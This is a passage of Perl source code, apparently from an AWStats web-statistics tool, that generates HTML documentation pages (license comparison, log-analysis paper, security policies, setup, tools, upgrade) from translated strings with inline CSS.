		<div class="term-card">
			$glossary_http_intro
			$glossary_http_classes
		</div>
		
		<div id="1xx" class="term-card">$glossary_http_1xx</div>
		<div id="2xx" class="term-card">$glossary_http_2xx</div>
		<div id="3xx" class="term-card">$glossary_http_3xx</div>
		<div id="4xx" class="term-card">$glossary_http_4xx</div>
		<div id="5xx" class="term-card">$glossary_http_5xx</div>
	</div>
	<div id="smtp" class="glossary-section glossary-smtp">
		<h2>$glossary_smtp_title</h2>
		
		<div class="term-card">
			$glossary_smtp_intro
		</div>
		
		<div id="SMTP23" class="term-card">$glossary_smtp_2xx</div>
		<div id="SMTP4" class="term-card">$glossary_smtp_4xx</div>
		<div id="SMTP5" class="term-card">$glossary_smtp_5xx</div>
	</div>
	
	<hr>
	
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 license 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_license_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.license.title");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $license_desc = _t("license.intro.desc");
	my $license_follow = _t("license.intro.follow");
	my $chart_title = _t("license.chart.title");
	my $table_header = _t("license.table.header");
	my $category_free = _t("license.category.free_software");
	my $category_semi_free = _t("license.category.semi_free");
	my $category_proprietary = _t("license.category.proprietary");
	my $category_modern = _t("license.category.modern_opensource");
	my $row_public_domain = _t("license.row.public_domain");
	my $row_mit = _t("license.row.mit");
	my $row_bsd2 = _t("license.row.bsd2");
	my $row_bsd3 = _t("license.row.bsd3");
	my $row_apache2 = _t("license.row.apache2");
	my $row_isc = _t("license.row.isc");
	my $row_lgpl = _t("license.row.lgpl");
	my $row_mpl2 = _t("license.row.mpl2");
	my $row_gpl = _t("license.row.gpl");
	my $row_agpl3 = _t("license.row.agpl3");
	my $row_epl2 = _t("license.row.epl2");
	my $row_cddl1 = _t("license.row.cddl1");
	my $row_semi_free = _t("license.row.semi_free");
	my $row_freeware = _t("license.row.freeware");
	my $row_shareware = _t("license.row.shareware");
	my $row_commercial = _t("license.row.commercial");
	my $row_python = _t("license.row.python");
	my $row_php = _t("license.row.php");
	my $row_artistic = _t("license.row.artistic");
	my $row_osl3 = _t("license.row.osl3");
	my $notes_title = _t("license.notes.title");
	my $note1 = _t("license.note1");
	my $note2 = _t("license.note2");
	my $note3 = _t("license.note3");
	my $note4 = _t("license.note4");
	my $note5 = _t("license.note5");
	my $note6 = _t("license.note6");
	my $note7 = _t("license.note7");
	my $note8 = _t("license.note8");
	my $note9 = _t("license.note9");
	my $note10 = _t("license.note10");
	my $important_title = _t("license.important.title");
	my $important_desc = _t("license.important.desc");
	my $license_date = _t("license.date");
	my $footer_author = _t("license.footer.author");
	my $footer_twitter = _t("license.footer.twitter");
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--accent-soft:#dbeafe;--surface:#ffffff;--surface-secondary:#f9fafb;--table-header:#e5e7eb;--table-row-even:#f9fafb;--permission-yes:#059669;--permission-no:#dc2626;--permission-maybe:#d97706;--permission-special:#7c3aed;--badge-bg:#e5e7eb;--category-bg:#f3f4f6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--accent-soft:#1e3a5f;--surface:#2d3748;--surface-secondary:#1f2937;--table-header:#374151;--table-row-even:#1f2937;--permission-yes:#34d399;--permission-no:#f87171;--permission-maybe:#fbbf24;--permission-special:#c084fc;--badge-bg:#374151;--category-bg:#2d3748}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1400px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.doc-card{background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;padding:25px;margin-bottom:30px}.license-intro{background-color:var(--accent-soft);padding:24px;border-radius:30px;margin-bottom:30px}.license-intro p{font-size:1.1rem;margin:0}.license-intro p:first-child{margin-bottom:10px}.license-chart-container{overflow-x:auto;margin:20px 0;border-radius:12px;border:1px solid var(--border-color)}.license-table{width:100%;border-collapse:collapse;min-width:1000px}.license-table th{background-color:var(--table-header);color:var(--text-color);padding:12px 8px;text-align:center;font-weight:600;border:1px solid var(--border-color)}.license-table td{padding:10px 8px;border:1px solid var(--border-color);vertical-align:middle}.license-table tr:nth-child(even){background-color:var(--table-row-even)}.license-table tr:hover{background-color:var(--border-color)}.category-row td{background-color:var(--category-bg);font-weight:600;text-align:left;padding:12px 15px}.license-badge{display:inline-block;padding:4px 8px;background-color:var(--badge-bg);border-radius:12px;font-size:0.9rem;font-family:'Monaco','Menlo',monospace}.permission-yes{color:var(--permission-yes);font-weight:600}.permission-no{color:var(--permission-no);font-weight:600}.permission-maybe{color:var(--permission-maybe);font-weight:600}.permission-special{color:var(--permission-special);font-weight:600}.license-notes{margin:30px 0;padding:20px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:12px}.license-notes p{margin:8px 0;line-height:1.5}.note-number{display:inline-block;width:24px;height:24px;background-color:var(--accent);color:white;border-radius:50%;text-align:center;line-height:24px;font-size:0.9rem;margin-right:8px}.license-date{margin-top:20px;padding:15px;background-color:var(--surface-secondary);border-radius:8px;font-style:italic;color:var(--text-color);opacity:0.8;text-align:center}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}sup{font-size:0.7rem;vertical-align:super}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<div class="doc-card">
		<h1>$doc_title</h1>
		
		<div class="license-intro">
			<p>$license_desc</p>
			<p style="color: var(--text-secondary);">$license_follow</p>
		</div>
		
		<h2>$chart_title</h2>
		
		<!-- 现代化表格 -->
		<div class="license-chart-container">
			<table class="license-table">
				$table_header
				<tbody>
					$category_free
					$row_public_domain
					$row_mit
					$row_bsd2
					$row_bsd3
					$row_apache2
					$row_isc
					$row_lgpl
					$row_mpl2
					$row_gpl
					$row_agpl3
					$row_epl2
					$row_cddl1
					
					$category_semi_free
					$row_semi_free
					
					$category_proprietary
					$row_freeware
					$row_shareware
					$row_commercial
					
					$category_modern
					$row_python
					$row_php
					$row_artistic
					$row_osl3
				</tbody>\
			</table>
		</div>
		<div class="license-notes">
			$notes_title
			$note1
			$note2
			$note3
			$note4
			$note5
			$note6
			$note7
			$note8
			$note9
			$note10
			<br>
			$important_title
			$important_desc
		</div>
		
		<div class="license-date">
			$license_date
		</div>
	</div>
	<hr>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 loganalysispaper 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_loganalysispaper_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.loganalysispaper.title");
	my $subtitle = _t("docs.loganalysispaper.subtitle");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $intro = _t("paper.intro");
	my $methods_title = _t("paper.methods.title");
	my $htmltag_title = _t("paper.method.htmltag.title");
	my $htmltag_desc = _t("paper.method.htmltag.desc");
	my $htmltag_pros_title = _t("paper.method.htmltag.pros.title");
	my $htmltag_pros_list = _t("paper.method.htmltag.pros.list");
	my $htmltag_cons_title = _t("paper.method.htmltag.cons.title");
	my $htmltag_cons_list = _t("paper.method.htmltag.cons.list");
	my $htmltag_summary_title = _t("paper.method.htmltag.summary.title");
	my $htmltag_summary = _t("paper.method.htmltag.summary");
	my $loganalysis_title = _t("paper.method.loganalysis.title");
	my $loganalysis_desc = _t("paper.method.loganalysis.desc");
	my $loganalysis_basic_title = _t("paper.loganalysis.basic_model.title");
	my $loganalysis_basic_desc = _t("paper.loganalysis.basic_model.desc");
	my $loganalysis_cache_title = _t("paper.loganalysis.cache.title");
	my $loganalysis_cache_desc = _t("paper.loganalysis.cache.desc");
	my $loganalysis_what_you_know_title = _t("paper.loganalysis.what_you_know.title");
	my $loganalysis_what_you_know_desc = _t("paper.loganalysis.what_you_know.desc");
	my $loganalysis_what_you_dont_know_title = _t("paper.loganalysis.what_you_dont_know.title");
	my $loganalysis_what_you_dont_know_desc = _t("paper.loganalysis.what_you_dont_know.desc");
	my $loganalysis_real_data_title = _t("paper.loganalysis.real_data.title");
	my $loganalysis_real_data_desc = sprintf( _t("paper.loganalysis.real_data.desc"), $StatsUrl );
	my $loganalysis_conclusion_title = _t("paper.loganalysis.conclusion.title");
	my $loganalysis_conclusion_desc = _t("paper.loganalysis.conclusion.desc");
	my $loganalysis_acknowledgements_title = _t("paper.loganalysis.acknowledgements.title");
	my $loganalysis_acknowledgements_desc = _t("paper.loganalysis.acknowledgements.desc");
	my $apptracking_title = _t("paper.method.apptracking.title");
	my $apptracking_desc = _t("paper.method.apptracking.desc");
	my $apptracking_pros_title = _t("paper.method.apptracking.pros.title");
	my $apptracking_pros_list = _t("paper.method.apptracking.pros.list");
	my $apptracking_cons_title = _t("paper.method.apptracking.cons.title");
	my $apptracking_cons_list = _t("paper.method.apptracking.cons.list");
	my $apptracking_summary_title = _t("paper.method.apptracking.summary.title");
	my $apptracking_summary = _t("paper.method.apptracking.summary");
	my $awstats_title = _t("paper.awstats.howitworks.title");
	my $awstats_desc = _t("paper.awstats.howitworks.desc");
	my $conclusion_title = _t("paper.conclusion.title");
	my $conclusion = _t("paper.conclusion");
	my $otherarticles_title = _t("paper.otherarticles.title");
	my $otherarticles_list = _t("paper.otherarticles.list");
	my $footer_author = _t("paper.footer.author");
	my $footer_googleplus = _t("paper.footer.googleplus");
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--accent-soft:#dbeafe;--surface:#ffffff;--surface-secondary:#f9fafb;--pros-bg:#e6f7e6;--pros-color:#059669;--cons-bg:#fee9e9;--cons-color:#dc2626;--summary-bg:#e6f3ff}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--accent-soft:#1e3a5f;--surface:#2d3748;--surface-secondary:#1f2937;--pros-bg:#064e3b;--pros-color:#34d399;--cons-bg:#7f1d1d;--cons-color:#f87171;--summary-bg:#1e3a5f}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}h2{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:8px;font-size:1.5em;margin:30px 0 20px}h3{color:var(--text-color);font-size:1.2em;margin:20px 0 10px}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.paper-section{background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;padding:25px;margin-bottom:30px}.intro-box{background-color:var(--accent-soft);border-left:4px solid var(--accent);padding:20px;border-radius:8px;margin:20px 0}.pros-box{background-color:var(--pros-bg);border-left:4px solid var(--pros-color);padding:15px;border-radius:8px;margin:15px 0}.pros-box h3{color:var(--pros-color);margin-top:0}.cons-box{background-color:var(--cons-bg);border-left:4px solid var(--cons-color);padding:15px;border-radius:8px;margin:15px 0}.cons-box h3{color:var(--cons-color);margin-top:0}.summary-box{background-color:var(--summary-bg);border-left:4px solid var(--accent);padding:15px;border-radius:8px;margin:15px 0}.summary-box h3{color:var(--accent);margin-top:0}.conclusion-box{background-color:var(--header-bg);border:1px solid var(--border-color);padding:20px;border-radius:8px;margin:20px 0;font-style:italic}ul{margin:10px 0;padding-left:25px}li{margin:5px 0}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}.footer-note a{color:var(--link-color);text-decoration:none}.footer-note a:hover{text-decoration:underline}.work-in-progress{color:var(--text-color);opacity:0.6;font-style:italic;text-align:center;padding:10px}.loganalysis-subsection{margin:30px 0;padding:20px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px}.loganalysis-subsection h3{color:var(--accent);margin-top:0;margin-bottom:15px;font-size:1.2em;border-bottom:1px solid var(--border-color);padding-bottom:8px}.loganalysis-subsection ol,.loganalysis-subsection ul{margin:10px 0;padding-left:25px}.loganalysis-subsection li{margin:5px 0}.loganalysis-subsection p{margin:10px 0}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<div class="paper-section">
		<h1>$doc_title</h1>
		
		<div class="intro-box">
			$intro
		</div>
		$methods_title
		<div id="htmltag">
			$htmltag_title
			$htmltag_desc
			<div class="pros-box">
				$htmltag_pros_title
				$htmltag_pros_list
			</div>
			
			<div class="cons-box">
				$htmltag_cons_title
				$htmltag_cons_list
			</div>

			<div class="summary-box">
				$htmltag_summary_title
				$htmltag_summary
			</div>
		</div>
		
		<div id="loganalysis">
			$loganalysis_title
			
			<div class="paper-section">
				$loganalysis_desc
				
				<!-- 1. 基础模型 -->
				<div class="loganalysis-subsection">
					$loganalysis_basic_title
					$loganalysis_basic_desc
				</div>
				
				<!-- 2. 缓存 -->
				<div class="loganalysis-subsection">
					$loganalysis_cache_title
					$loganalysis_cache_desc
				</div>
				
				<!-- 3. 你能知道什么 -->
				<div class="loganalysis-subsection">
					$loganalysis_what_you_know_title
					$loganalysis_what_you_know_desc
				</div>
				
				<!-- 4. 你不能知道什么 -->
				<div class="loganalysis-subsection">
					$loganalysis_what_you_dont_know_title
					$loganalysis_what_you_dont_know_desc
				</div>
				
				<!-- 5. 真实数据 -->
				<div class="loganalysis-subsection">
					$loganalysis_real_data_title
					$loganalysis_real_data_desc
				</div>
				
				<!-- 6. 结论 -->
				<div class="loganalysis-subsection">
					$loganalysis_conclusion_title
					$loganalysis_conclusion_desc
				</div>
				
				<!-- 7. 致谢和进一步阅读 -->
				<div class="loganalysis-subsection">
					$loganalysis_acknowledgements_title
					$loganalysis_acknowledgements_desc
				</div>
			</div>
		</div>
		
		<!-- === 应用追踪 === -->
		<div id="apptracking">
			$apptracking_title
			$apptracking_desc
			
			<div class="pros-box">
				$apptracking_pros_title
				$apptracking_pros_list
			</div>
			
			<div class="cons-box">
				$apptracking_cons_title
				$apptracking_cons_list
			</div>
			
			<div class="summary-box">
				$apptracking_summary_title
				$apptracking_summary
			</div>
		</div>
		
		<!-- === AWStats 工作原理 === -->
		<div id="howitworks">
			$awstats_title
			<div class="paper-section">
				$awstats_desc
			</div>
		</div>
		
		<!-- === 结论 === -->
		<div class="conclusion-box">
			$conclusion_title
			$conclusion
		</div>
		
		<!-- === 其他文章 === -->
		<h2>$otherarticles_title</h2>
		<div class="paper-section">
			$otherarticles_list
		</div>
		
		<hr>
		
		<div class="footer-note">
			<p>$footer_author</p>
			$footer_googleplus
		</div>
	</div>
	
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 security 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_security_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.security.title");
	my $subtitle = _t("docs.security.subtitle");
	my $full_title = "$doc_title - $page_title";
	my $intro = _t("security.intro");
	my $label_policy = _t("security.label.policy");
	my $label_advantage = _t("security.label.advantage");
	my $label_disadvantage = _t("security.label.disadvantage");
	my $label_how = _t("security.label.how");
	my $policy1_title = _t("security.policy1.title");
	my $policy1_policy = _t("security.policy1.policy");
	my $policy1_advantage = _t("security.policy1.advantage");
	my $policy1_disadvantage = _t("security.policy1.disadvantage");
	my $policy1_how = _t("security.policy1.how");
	   $policy1_how =~ s/\\n/\n/g;
	my $policy2_title = _t("security.policy2.title");
	my $policy2_policy = _t("security.policy2.policy");
	my $policy2_advantage = _t("security.policy2.advantage");
	my $policy2_disadvantage = _t("security.policy2.disadvantage");
	my $policy2_how = _t("security.policy2.how");
	   $policy2_how =~ s/\\n/\n/g;
	my $force_config = _t("security.force_config");
	my $policy3_title = _t("security.policy3.title");
	my $policy3_policy = _t("security.policy3.policy");
	my $policy3_advantage = _t("security.policy3.advantage");
	my $policy3_disadvantage = _t("security.policy3.disadvantage");
	my $policy3_how = _t("security.policy3.how");
	my $conclusion = _t("security.conclusion");
	my $footer_author = _t("security.footer.author");
	my $footer_twitter = _t("security.footer.twitter");
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--accent-soft:#dbeafe;--surface:#ffffff;--surface-secondary:#f9fafb;--policy-high:#8b5cf6;--policy-medium:#f59e0b;--policy-none:#6b7280;--policy-high-soft:#ede9fe;--policy-medium-soft:#fef3c7;--policy-none-soft:#f3f4f6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--accent-soft:#1e3a5f;--surface:#2d3748;--surface-secondary:#1f2937;--policy-high:#a78bfa;--policy-medium:#fbbf24;--policy-none:#9ca3af;--policy-high-soft:#2d2b4d;--policy-medium-soft:#4d3d1f;--policy-none-soft:#2d3748}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.security-section{background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;padding:25px;margin-bottom:30px}.intro-box{background-color:var(--accent-soft);border-left:4px solid var(--accent);padding:20px;border-radius:8px;margin:20px 0}.policy-card{margin:30px 0;padding:25px;border-radius:12px;border-left:6px solid;scroll-margin-top:80px}.policy-card h2{margin-top:0;font-size:1.5em;border-bottom:1px solid var(--border-color);padding-bottom:10px}.policy-high{background-color:var(--policy-high-soft);border-left-color:var(--policy-high)}.policy-medium{background-color:var(--policy-medium-soft);border-left-color:var(--policy-medium)}.policy-none{background-color:var(--policy-none-soft);border-left-color:var(--policy-none)}.policy-high h2{color:var(--policy-high)}.policy-medium h2{color:var(--policy-medium)}.policy-none h2{color:var(--policy-none)}.policy-label{display:inline-block;font-weight:600;margin-top:15px;color:var(--accent)}pre{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9rem;margin:15px 0}code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace;font-size:0.9rem}.tip-box{background-color:var(--header-bg);border-left:4px solid var(--accent);padding:20px;border-radius:8px;margin:20px 0}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<h1>$doc_title</h1>
	<div class="security-section">
		<!-- === 引言 === -->
		<div class="intro-box">
			$intro
		</div>
		
		<!-- === 安全策略 1 === -->
		<div id="1" class="policy-card policy-high">
			$policy1_title
			
			<div class="policy-label">$label_policy</div>
			$policy1_policy
			
			<div class="policy-label">$label_advantage</div>
			$policy1_advantage
			
			<div class="policy-label">$label_disadvantage</div>
			$policy1_disadvantage
			
			<div class="policy-label">$label_how</div>
			$policy1_how
		</div>
		
		<!-- === 安全策略 2 === -->
		<div id="2" class="policy-card policy-medium">
			$policy2_title
			
			<div class="policy-label">$label_policy</div>
			$policy2_policy
			
			<div class="policy-label">$label_advantage</div>
			$policy2_advantage
			
			<div class="policy-label">$label_disadvantage</div>
			$policy2_disadvantage
			
			<div class="policy-label">$label_how</div>
			$policy2_how
			
			<!-- === AWSTATS_FORCE_CONFIG 环境变量 === -->
			<div class="tip-box">
				$force_config
			</div>
		</div>
		
		<!-- === 安全策略 3 === -->
		<div id="3" class="policy-card policy-none">
			$policy3_title
			
			<div class="policy-label">$label_policy</div>
			$policy3_policy
			
			<div class="policy-label">$label_advantage</div>
			$policy3_advantage
			
			<div class="policy-label">$label_disadvantage</div>
			$policy3_disadvantage
			
			<div class="policy-label">$label_how</div>
			$policy3_how
		</div>
		
		<!-- === 结论 === -->
		<div class="tip-box">
			$conclusion
		</div>
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}
#------------------------------------------------------------------------------
# 生成 setup 页面
# Parameters: $dir (setup目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_setup_doc {
	my ($dir) = @_;
	
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.setup.title");
	my $subtitle = _t("docs.setup.subtitle");
	my $content = _t("docs.setup.content");
	   $content =~ s/\\n/\n/g;
	my $full_title = "$doc_title - $page_title";
	
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3,h4{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.code-block{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:monospace;white-space:pre-wrap;margin:15px 0}.step{margin:25px 0;padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px}.step-detail{margin:20px 0;padding:15px;background-color:var(--bg-color);border-radius:6px}.note{font-style:italic;opacity:0.8}.conclusion{font-weight:bold;color:var(--link-color)}.footer{margin-top:40px;padding:20px;text-align:center;border-top:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin:5px 0}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	<div class="section">
		$content
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}
#------------------------------------------------------------------------------
# 生成 tools 文档页面
# Parameters: $dir (tools目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_tools_doc {
	my ($dir) = @_;
	
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.tools.title");
	my $subtitle = _t("docs.tools.subtitle");
	my $content = _t("docs.tools.content");
	   $content =~ s/\\n/\n/g;
	my $full_title = "$doc_title - $page_title";
	
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9;--warning-color:#b91c1c}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748;--warning-color:#f87171}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3,h4{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}a{color:var(--link-color);text-decoration:none}a:hover{text-decoration:underline}.code-block{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:monospace;white-space:pre-wrap;margin:15px 0}.tool-section{margin:30px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px}.usage{margin:20px 0;padding:15px;background-color:var(--bg-color);border-radius:6px}.example{margin:20px 0;padding:15px;background-color:var(--bg-color);border-left:4px solid var(--link-color);border-radius:4px}.note{font-style:italic;opacity:0.8;color:var(--link-color)}.warning{color:var(--warning-color);font-weight:bold}.footer{margin-top:40px;padding:20px;text-align:center;border-top:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin:5px 0}code{background-color:var(--code-bg);padding:2px 4px;border-radius:4px;font-family:monospace}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	<div class="section">
		$content
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}
#------------------------------------------------------------------------------
# 生成 upgrade 文档页面
# Parameters: $dir (upgrade目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_upgrade_doc {
	my ($dir) = @_;
	
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.upgrade.title");
	my $subtitle = _t("docs.upgrade.subtitle");
	my $content = _t("docs.upgrade.content");
	$content =~ s/\\n/\n/g;
	my $full_title = "$doc_title - $page_title";
	
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
